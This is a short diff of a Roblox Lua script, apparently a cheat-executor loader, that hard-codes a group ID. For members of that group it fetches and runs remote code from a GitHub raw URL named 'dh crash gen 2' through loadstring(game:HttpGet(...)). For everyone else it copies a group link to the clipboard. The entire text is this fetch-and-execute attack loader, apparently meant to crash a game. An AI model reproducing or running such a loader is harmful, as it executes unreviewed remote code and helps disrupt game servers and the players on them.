@@ -1,5 +1,5 @@
 local plr = game.Players.LocalPlayer
-if plr:IsInGroup(groupidhere) then
+if plr:IsInGroup(9497553) then
 loadstring(game:HttpGet("https://raw.githubusercontent.com/22kyasue/22dupes/master/dh%20crash%20gen%202", true))()
 else
  setclipboard('https://www.roblox.com/groups/9497553/XJavascript-get-delete-the-x#!/about')
